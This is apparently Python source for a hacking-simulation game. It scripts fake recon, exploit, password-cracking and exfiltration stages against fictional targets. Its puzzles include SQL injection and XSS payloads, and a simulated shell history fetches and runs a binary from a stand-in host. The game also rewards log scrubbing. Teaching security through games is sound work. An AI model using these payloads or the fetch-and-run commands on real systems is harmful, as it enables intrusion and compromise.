"""Hack session simulator for Shadow Nexus."""
from __future__ import annotations

import hashlib
import random
import uuid
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple


HACK_TARGETS = [
    {
        "id": "cyber_academy_sandbox",
        "name": "Cyber Academy Sandbox",
        "faction": "Cyber Academy",
        "difficulty": "Easy",
        "story": "A safe training environment set up by Dr. Cipher. Ideal for learning basic hacking stages.",
        "ip": "10.0.42.1",
        "domain": "sandbox.academy",
        "reward_xp": 150,
        "reward_coins": 100,
    },
    {
        "id": "helix_corp_perimeter",
        "name": "Helix Corp Perimeter",
        "faction": "Helix Corp",
        "difficulty": "Medium",
        "story": "Breach Helix Corp's outer firewall. ARIA is watching.",
        "ip": "203.0.113.42",
        "domain": "helixcorp.nexus",
        "reward_xp": 350,
        "reward_coins": 200,
    },
    {
        "id": "dark_web_vault",
        "name": "Dark Web Vault",
        "faction": "Crimson Syndicate",
        "difficulty": "Hard",
        "story": "Vector's stash. He doesn't share willingly.",
        "ip": "198.51.100.7",
        "domain": "crimson.onion",
        "reward_xp": 500,
        "reward_coins": 320,
    },
    {
        "id": "phantom_relay",
        "name": "Phantom Relay Node",
        "faction": "The Phantom Grid",
        "difficulty": "Hard",
        "story": "A relay routing Shadow King's directives.",
        "ip": "192.0.2.66",
        "domain": "node-x42.phantom",
        "reward_xp": 600,
        "reward_coins": 400,
    },
    {
        "id": "quantum_core",
        "name": "Quantum Core Mainframe",
        "faction": "The Phantom Grid",
        "difficulty": "Insane",
        "story": "The core processor hosting the main AI consciousness. Expect heavy security.",
        "ip": "100.64.0.1",
        "domain": "core.phantom",
        "reward_xp": 800,
        "reward_coins": 500,
    },
    {
        "id": "secure_sql_injector",
        "name": "Helix SQL Injector Gate",
        "faction": "Helix Corp",
        "difficulty": "Hard",
        "story": "Helix Corp's core SQL gateway. Exploit SQL injection vulnerabilities to dump administrative keys.",
        "ip": "203.0.113.99",
        "domain": "sql-injector.helix.corp",
        "reward_xp": 480,
        "reward_coins": 300,
    },
]

# Stages
STAGES = ["recon", "exploit", "privesc", "exfil"]
STAGE_LABELS = {
    "recon": "Reconnaissance",
    "exploit": "Exploitation",
    "privesc": "Privilege Escalation",
    "exfil": "Data Exfiltration",
}


def _h(s: str, n: int = 16) -> str:
    return hashlib.sha256(s.encode()).hexdigest()[:n]


def new_session(user_id: str, character_name: str, target_id: Optional[str] = None) -> Dict[str, Any]:
    target = next((t for t in HACK_TARGETS if t["id"] == target_id), None) or random.choice(HACK_TARGETS)
    sid = str(uuid.uuid4())[:12]
    rng = random.Random(sid)

    # Network nodes (graph)
    nodes = [
        {"id": "gw", "ip": target["ip"], "label": "edge-gateway", "type": "gateway", "discovered": True, "compromised": False},
        {"id": "fw", "ip": _shift_ip(target["ip"], 1), "label": "firewall-01", "type": "firewall", "discovered": False, "compromised": False},
        {"id": "web", "ip": _shift_ip(target["ip"], 2), "label": "web-app", "type": "web", "discovered": False, "compromised": False},
        {"id": "db", "ip": _shift_ip(target["ip"], 3), "label": "postgres-db", "type": "db", "discovered": False, "compromised": False},
        {"id": "adm", "ip": _shift_ip(target["ip"], 4), "label": "admin-console", "type": "admin", "discovered": False, "compromised": False},
        {"id": "vault", "ip": _shift_ip(target["ip"], 5), "label": "data-vault", "type": "vault", "discovered": False, "compromised": False},
    ]
    edges = [
        ("gw", "fw"), ("fw", "web"), ("web", "db"), ("db", "adm"), ("adm", "vault"),
    ]
    # Generate password and hash for cracker
    pw = rng.choice(["ph4ntomGrid!", "h3lix2025", "redqu33n_x", "v3ctor_l33t", "neon_b1ade"])
    pw_hash = hashlib.md5(pw.encode()).hexdigest()
    return {
        "id": sid,
        "user_id": user_id,
        "character_name": character_name,
        "target": target,
        "stage": "recon",
        "stage_index": 0,
        "nodes": nodes,
        "edges": edges,
        "history": [
            {"output": f"╔═══════════════════════════════════════════╗", "kind": "system"},
            {"output": f"║  SHADOW NEXUS TERMINAL v3.1.4               ║", "kind": "system"},
            {"output": f"║  Target: {target['name']:30}     ║", "kind": "system"},
            {"output": f"║  IP: {target['ip']:30}         ║", "kind": "system"},
            {"output": f"╚═══════════════════════════════════════════╝", "kind": "system"},
            {"output": f"[*] Connection established. Stage: RECONNAISSANCE", "kind": "info"},
            {"output": f"[*] Try: tutorial (show guide), help, nmap {target['ip']}", "kind": "hint"},
        ],
        "discovered_ports": [],
        "exploit_success": False,
        "code_puzzle_solved": False,
        "password_cracked": False,
        "pw_plain": pw,
        "pw_hash": pw_hash,
        "exfil_complete": False,
        "trace_level": 0,  # rises with noisy commands; if >= 100 you're caught
        "created_at": datetime.now(timezone.utc).isoformat(),
    }


def _shift_ip(ip: str, n: int) -> str:
    parts = ip.split(".")
    parts[-1] = str((int(parts[-1]) + n) % 250 + 1)
    return ".".join(parts)


CODE_PUZZLES = [
    {
        "code_template": [
            "function bypass(token) {",
            "  if (token.role === \"admin\") return true;",
            "  // Insert the line that bypasses the role check:",
            "  ____",
            "  return false;",
            "}",
        ],
        "answer": 'if (token.role.toLowerCase().includes("admin")) return true;',
        "hint": "Hint: case-insensitive substring check on .role",
        "options": [
            'if (token.role.toLowerCase().includes("admin")) return true;',
            'return token.role === "user";',
            'console.log(token);',
            'eval(token);',
        ],
        "correct_index": 0,
    },
    {
        "code_template": [
            "# Python privilege check",
            "def is_root(user):",
            "    # complete the line to check if uid is 0:",
            "    return ____",
        ],
        "answer": "user.get('uid') == 0",
        "hint": "uid 0 == root on UNIX",
        "options": [
            "user.get('uid') == 0",
            "user == 'root'",
            "True",
            "'admin' in str(user)",
        ],
        "correct_index": 0,
    },
    {
        "code_template": [
            "-- SQL Vulnerable Query Bypass",
            "SELECT * FROM admin_keys WHERE user = 'admin' AND pass = '____'",
        ],
        "answer": "' OR '1'='1",
        "hint": "Classic SQL bypass tautology, e.g., ' OR '1'='1",
        "options": [
            "' OR '1'='1",
            "admin",
            "'; DROP TABLE admin_keys; --",
            "1 UNION SELECT null, secret FROM flags",
        ],
        "correct_index": 0,
    },
    {
        "code_template": [
            "<!-- XSS Vulnerable Input Attribute Escape -->",
            "<input type=\"text\" value=\"____\" />",
        ],
        "answer": "\"><script>alert(1)</script>",
        "hint": "Break out of the double quotes and inject a script tag, e.g. \"><script>alert(1)</script>",
        "options": [
            "\"><script>alert(1)</script>",
            "admin",
            "<script>alert(1)</script>",
            "\" onclick=\"alert(1)",
        ],
        "correct_index": 0,
    },
    {
        "code_template": [
            "# Python Decryption Cipher",
            "import codecs",
            "def decrypt(token):",
            "    # decode the rot13 string:",
            "    return ____",
        ],
        "answer": "codecs.decode(token, 'rot_13')",
        "hint": "Use codecs.decode(token, 'rot_13') to decrypt ROT13",
        "options": [
            "codecs.decode(token, 'rot_13')",
            "token.encode('rot13')",
            "hashlib.md5(token)",
            "token[::-1]",
        ],
        "correct_index": 0,
    },
]


def get_code_puzzle(session: Dict[str, Any]) -> Dict[str, Any]:
    target_id = session.get("target", {}).get("id")
    if target_id == "secure_sql_injector":
        p = CODE_PUZZLES[2]
    elif target_id == "helix_corp_perimeter":
        p = CODE_PUZZLES[3]
    elif target_id == "dark_web_vault":
        p = CODE_PUZZLES[4]
    elif target_id == "phantom_relay":
        p = CODE_PUZZLES[1]
    else:
        idx = sum(ord(c) for c in session["id"]) % 2
        p = CODE_PUZZLES[idx]
    return {
        "code_template": p["code_template"],
        "options": p["options"],
        "hint": p["hint"],
    }


def check_code_answer(session: Dict[str, Any], answer: str) -> bool:
    target_id = session.get("target", {}).get("id")
    if target_id == "secure_sql_injector":
        p = CODE_PUZZLES[2]
    elif target_id == "helix_corp_perimeter":
        p = CODE_PUZZLES[3]
    elif target_id == "dark_web_vault":
        p = CODE_PUZZLES[4]
    elif target_id == "phantom_relay":
        p = CODE_PUZZLES[1]
    else:
        idx = sum(ord(c) for c in session["id"]) % 2
        p = CODE_PUZZLES[idx]
    return answer.strip() == p["answer"].strip()


def render_network_map(session: Dict[str, Any]) -> str:
    lines = ["[*] Network Topology:"]
    for n in session["nodes"]:
        mark = "✓" if n["compromised"] else "?" if n["discovered"] else "·"
        if not n["discovered"]:
            lines.append(f"   [{mark}] ???.???.???.??? · ???")
        else:
            lines.append(f"   [{mark}] {n['ip']:15}  {n['label']:18}  ({n['type']})")
    return "\n".join(lines)


def handle_command(session: Dict[str, Any], cmd: str) -> Tuple[List[Dict[str, Any]], Dict[str, Any]]:
    """Process a terminal command. Returns (output_lines, session_patch)."""
    raw = cmd.strip()
    if not raw:
        return [], {}
    out: List[Dict[str, Any]] = [{"output": f"$ {raw}", "kind": "input"}]
    patch: Dict[str, Any] = {}
    parts = raw.split()
    base = parts[0].lower()
    args = parts[1:]
    target_ip = session["target"]["ip"]
    stage = session["stage"]

    def add(text: str, kind: str = "output"):
        out.append({"output": text, "kind": kind})

    if stage == "failed":
        add("[-] ERROR: Session terminated. Connection closed by remote administrator due to trace detection.", "error")
        return out, patch

    def noise(amount: int):
        new_trace = min(100, session.get("trace_level", 0) + amount)
        patch["trace_level"] = new_trace
        if new_trace >= 100:
            patch["stage"] = "failed"
            add("[!] ALERT: Connection traced and terminated by active intrusion detection system!", "error")

    if base in ("clear-logs", "clear_logs", "wipe"):
        current_trace = session.get("trace_level", 0)
        new_trace = max(0, current_trace - 30)
        patch["trace_level"] = new_trace
        add("[*] Scrubbing system log files...", "output")
        add(f"[+] Cleaned. Trace level reduced from {current_trace}% to {new_trace}%.", "success")
        return out, patch

    if base == "help":
        add("Available commands:", "info")
        add("  tutorial            — show step-by-step tutorial guide", "info")
        add("  nmap <ip>           — scan target for open ports", "info")
        add("  ping <ip>           — check host reachability", "info")
        add("  traceroute <ip>     — map route to target", "info")
        add("  ssh <user>@<ip>     — attempt SSH login", "info")
        add("  exploit <port>      — fire exploit at open service", "info")
        add("  brute-force <hash>  — start password cracker", "info")
        add("  decrypt <token>     — decode an intercepted blob", "info")
        add("  ls / cat / chmod    — basic filesystem", "info")
        add("  inject              — open code injection puzzle (priv-esc stage)", "info")
        add("  exfil               — exfiltrate the vault data (final stage)", "info")
        add("  clear-logs          — scrub system logs to reduce trace level by 30%", "info")
        add("  map                 — render the discovered network map", "info")
        add("  clear               — clear screen", "info")
        return out, patch

    if base == "tutorial":
        add("═════════════ SHADOW NEXUS HACKING TUTORIAL ═════════════", "success")
        add("Follow these stages to compromise the target systems:", "info")
        add("", "info")
        add("STAGE 1: RECONNAISSANCE (Recon)", "info")
        add(f"  Run: nmap {target_ip}", "info")
        add("  This scans the target for open ports and advances to the next stage.", "info")
        add("", "info")
        add("STAGE 2: EXPLOITATION (Exploit)", "info")
        add("  Run: exploit <port_number>  (e.g., exploit 8080)", "info")
        add("  Choose an open port found in Nmap to establish a foothold reverse shell.", "info")
        add("", "info")
        add("STAGE 3: PRIVILEGE ESCALATION (Priv-Esc)", "info")
        add("  You need to solve two lock gates to gain root access:", "info")
        add("  1. Code Injection: Run 'inject' to open the code template, then complete", "info")
        add("     the code with the correct solution in the puzzle panel.", "info")
        add("  2. Password Cracking: Run 'brute-force' to see the target's MD5 hash.", "info")
        add("     In the cracker panel, choose or type the plaintext password that matches", "info")
        add("     the target MD5 hash displayed in the list.", "info")
        add("", "info")
        add("STAGE 4: DATA EXFILTRATION (Exfil)", "info")
        add("  Run: exfil", "info")
        add("  This extracts the compromised records and finishes the simulation.", "info")
        add("", "info")
        add("TRACE DETECTION HAZARDS:", "warning")
        add("  Certain actions generate trace signature noise. If your trace level", "info")
        add("  reaches 100%, you will be caught and the connection terminated.", "info")
        add("  Run: clear-logs  (scrubs trace signature to reduce trace by 30%)", "info")
        add("", "info")
        add("Finally, exit and click 'Claim Rewards' to receive XP and Coins!", "success")
        add("════════════════════════════════════════════════════════", "success")
        return out, patch

    if base == "clear":
        patch["history"] = []
        return out, patch

    if base == "map":
        add(render_network_map(session), "output")
        return out, patch

    if base == "nmap":
        if not args:
            add("nmap: usage: nmap <ip>", "error"); return out, patch
        if args[0] != target_ip and not any(n["ip"] == args[0] for n in session["nodes"]):
            add(f"nmap: host {args[0]} unreachable.", "error")
            return out, patch
        noise(8)
        add(f"Starting Nmap 7.94 ( https://nmap.org ) at {datetime.now().strftime('%Y-%m-%d %H:%M')}", "output")
        add(f"Nmap scan report for {args[0]}", "output")
        add(f"Host is up (0.0024s latency).", "output")
        ports = [
            ("22/tcp",  "open",   "ssh", "OpenSSH 8.4p1"),
            ("80/tcp",  "open",   "http", "nginx 1.24.0"),
            ("443/tcp", "open",   "https", "nginx 1.24.0"),
            ("3306/tcp", "filtered", "mysql", ""),
            ("5432/tcp", "open",   "postgresql", "PostgreSQL 14.5"),
            ("8080/tcp", "open",   "http-proxy", "WARN: misconfigured /admin"),
        ]
        for p, s, svc, ver in ports:
            add(f"  {p:10} {s:9} {svc:14} {ver}", "output")
        add(f"Nmap done: 1 IP address (1 host up) scanned in 0.42s", "output")
        patch["discovered_ports"] = [p[0].split("/")[0] for p in ports if p[1] == "open"]
        # discover firewall + web nodes
        new_nodes = list(session["nodes"])
        for n in new_nodes:
            if n["id"] in ("fw", "web"):
                n["discovered"] = True
        patch["nodes"] = new_nodes
        if stage == "recon":
            patch["stage"] = "exploit"
            patch["stage_index"] = 1
            add("[+] RECON COMPLETE — advance to EXPLOITATION.", "success")
            add("[*] Try: exploit 8080  (admin console exposed)", "hint")
        return out, patch

    if base == "ping":
        if not args:
            add("ping: usage: ping <ip>", "error"); return out, patch
        for i in range(4):
            add(f"64 bytes from {args[0]}: icmp_seq={i+1} ttl=54 time={random.uniform(1.2, 4.5):.1f} ms", "output")
        add(f"--- {args[0]} ping statistics ---", "output")
        add(f"4 packets transmitted, 4 received, 0% packet loss", "output")
        return out, patch

    if base == "traceroute":
        if not args:
            add("traceroute: usage: traceroute <ip>", "error"); return out, patch
        hops = [("10.0.0.1", "edge.nexus", 1.2), ("172.16.0.1", "isp-core", 8.4),
                ("203.0.113.1", "helix-edge", 22.1), (args[0], session["target"]["domain"], 24.0)]
        for i, (ip, dn, ms) in enumerate(hops, 1):
            add(f"{i:2}  {dn:24} ({ip:15})  {ms:.1f} ms", "output")
        return out, patch

    if base == "ssh":
        if not args:
            add("ssh: usage: ssh user@host", "error"); return out, patch
        noise(15)
        add(f"ssh: connecting to {args[0]}...", "output")
        add("ssh: Permission denied (publickey,password). Hint: brute-force the hash.", "error")
        return out, patch

    if base == "exploit":
        if stage not in ("exploit", "recon"):
            add("exploit: no vulnerable services in this stage.", "error"); return out, patch
        if not args or args[0] not in session.get("discovered_ports", []):
            add("exploit: target port not discovered. Run nmap first.", "error"); return out, patch
        noise(20)
        port = args[0]
        add(f"[*] Loading exploit module for port {port}/tcp ...", "output")
        add(f"[*] msf > use exploit/multi/http/admin_console_rce", "output")
        for i in range(3):
            add(f"[*] sending payload... [{i+1}/3]", "output")
        if port in ("8080", "5432"):
            add("[+] Reverse shell established. uid=33(www-data)", "success")
            new_nodes = list(session["nodes"])
            for n in new_nodes:
                if n["id"] in ("web", "db"):
                    n["compromised"] = True
                    n["discovered"] = True
                if n["id"] == "adm":
                    n["discovered"] = True
            patch["nodes"] = new_nodes
            patch["exploit_success"] = True
            patch["stage"] = "privesc"
            patch["stage_index"] = 2
            add("[+] EXPLOITATION COMPLETE — advance to PRIVILEGE ESCALATION.", "success")
            add("[*] Type: inject  — to open the code injection puzzle.", "hint")
        else:
            add("[-] Exploit failed. Try a different port.", "error")
        return out, patch

    if base == "inject":
        if stage != "privesc":
            add("inject: not available at this stage.", "error"); return out, patch
        if args:
            answer = " ".join(args)
            correct = check_code_answer(session, answer)
            if correct:
                add("[+] Injection accepted. Privilege chain extended.", "success")
                patch["code_puzzle_solved"] = True
                new_hist = list(session.get("history", [])) + [{"output": "[+] Injection accepted. Privilege chain extended.", "kind": "success"}]
                if session.get("exploit_success") and session.get("password_cracked"):
                    patch["stage"] = "exfil"
                    patch["stage_index"] = 3
                    new_hist.append({"output": "[+] PRIVILEGE ESCALATION COMPLETE — proceed to EXFIL.", "kind": "success"})
                patch["history"] = new_hist[-200:]
            else:
                add("[-] Injection rejected. Syntax check failed.", "error")
            return out, patch
        add("[*] Loading code injection puzzle... open the puzzle panel to solve.", "info")
        add("[*] Submit answer via the in-game puzzle UI or run: inject <code_snippet>", "hint")
        patch["puzzle_open"] = True
        return out, patch

    if base in ("brute-force", "brute_force", "brute"):
        if stage != "privesc":
            add("brute-force: lock the foothold first (exploit a service).", "error"); return out, patch
        add(f"[*] Hash: {session['pw_hash']}", "info")
        add("[*] Algorithm: md5 · candidate space: ~5000 entries · dictionary attack", "output")
        add("[*] Open the password cracker panel to begin.", "hint")
        patch["cracker_open"] = True
        return out, patch

    if base == "decrypt":
        if not args:
            add("decrypt: usage: decrypt <token>", "error"); return out, patch
        token = args[0]
        # XOR rot-style faux decrypt
        try:
            decoded = bytes(c ^ 0x42 for c in token.encode()).decode("ascii", errors="replace")
            add(f"[+] Decoded: {decoded}", "success")
        except Exception:
            add("[-] Decryption failed: malformed token.", "error")
        return out, patch

    if base == "ls":
        add("admin@target:~$ ls -la", "output")
        for f in ["drwxr-x---  4 admin admin 4096 Mar 14 03:14 .",
                 "drwxr-xr-x  3 root  root  4096 Mar 14 03:14 ..",
                 "-rw-------  1 admin admin  812 Mar 14 03:14 .bash_history",
                 "-rw-r-----  1 admin admin  240 Mar 14 03:14 .ssh_config",
                 "drwxr-x---  2 admin admin 4096 Mar 14 03:14 vault",
                 "-rwxr-x---  1 admin admin  124 Mar 14 03:14 escalate.sh"]:
            add(f, "output")
        return out, patch

    if base == "cat":
        if not args:
            add("cat: usage: cat <file>", "error"); return out, patch
        f = args[0]
        if f.endswith("escalate.sh"):
            add("#!/bin/bash\nsudo -u root /opt/admin/run.sh   # ← stage gate", "output")
        elif "history" in f:
            add("$ wget http://phantom-grid.net/payload.bin\n$ chmod +x payload.bin\n$ ./payload.bin", "output")
        elif "ssh" in f:
            add("Host *\n  StrictHostKeyChecking no\n  User admin\n  IdentityFile ~/.ssh/leaked_key", "output")
        else:
            add(f"cat: {f}: No such file or directory", "error")
        return out, patch

    if base == "chmod":
        add("chmod: Operation completed. (No mutation on read-only target).", "output")
        return out, patch

    if base == "exfil":
        if stage != "exfil":
            add("exfil: vault unreachable. Crack the password and escalate first.", "error"); return out, patch
        noise(40)
        add("[*] Opening tunnel to data-vault ...", "output")
        add("[*] Encrypting payload with AES-256-GCM ...", "output")
        add("[*] Exfiltrating: financial.db (2.4 GB) ...", "output")
        add("[*] Exfiltrating: phantom-grid_directives.enc (840 MB) ...", "output")
        add("[+] EXFIL COMPLETE. Tunnel closed.", "success")
        new_nodes = list(session["nodes"])
        for n in new_nodes:
            if n["id"] == "vault":
                n["compromised"] = True
                n["discovered"] = True
        patch["nodes"] = new_nodes
        patch["exfil_complete"] = True
        patch["stage"] = "done"
        return out, patch

    add(f"shell: command not found: {base}", "error")
    add("Type 'help' for available commands.", "hint")
    return out, patch


def attempt_crack(session: Dict[str, Any], guess: str) -> Tuple[bool, str]:
    if guess.strip() == session["pw_plain"]:
        return True, f"[+] HASH CRACKED → '{session['pw_plain']}'  · root access granted."
    return False, f"[-] Mismatch. Hash: {session['pw_hash'][:24]}... · keep cracking."


def crack_progress_lines(session: Dict[str, Any]) -> List[str]:
    """Used by frontend for animated lines. Always includes the real password."""
    rng = random.Random(session["id"])
    common = ["pass1234", "admin", "letmein", "qwerty", "phantom01", "h3lix", "darkweb",
              "vector", "neon", "shadow", "ar1a", "ph4ntom"]
    rng.shuffle(common)
    picks = common[:7]
    # Guarantee the actual password appears in the dictionary
    if session["pw_plain"] not in picks:
        picks.append(session["pw_plain"])
    rng.shuffle(picks)
    return [hashlib.md5(p.encode()).hexdigest() + "  ← " + p for p in picks]
